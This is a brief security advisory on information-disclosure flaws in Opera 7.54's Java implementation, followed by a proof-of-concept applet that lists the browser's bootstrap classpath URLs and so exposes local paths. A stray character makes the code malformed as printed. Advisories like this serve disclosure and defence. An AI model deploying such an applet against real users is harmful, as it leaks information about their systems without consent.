source: http://www.securityfocus.com/bid/11712/info
  
Multiple remote vulnerabilities reportedly affect the Opera Web Browser Java implementation. These issues are due to the insecure proprietary design of the Web browser's Java implementation.
  
These issues may allow an attacker to craft a Java applet that violate Sun's Java secure programming guidelines.
  
These issues may be leveraged to carry out a variety of unspecified attacks including sensitive information disclosure and denial of service attacks. Any successful exploitation would take place with the privileges of the user running the affected browser application.
  
Although only version 7.54 is reportedly vulnerable, it is likely that earlier versions are vulnerable to these issues as well.

import sun.misc.*;
import java.util.Enumeration;

public class Opera754LauncherApplet extends java.applet.Applet{

	public void start()? {
		URLClassPath o = Launcher.getBootstrapClassPath();
		for (int i = 0; i < o.getURLs().length; i++) {
			System.out.println(o.getURLs()[i]);
		}
	}
}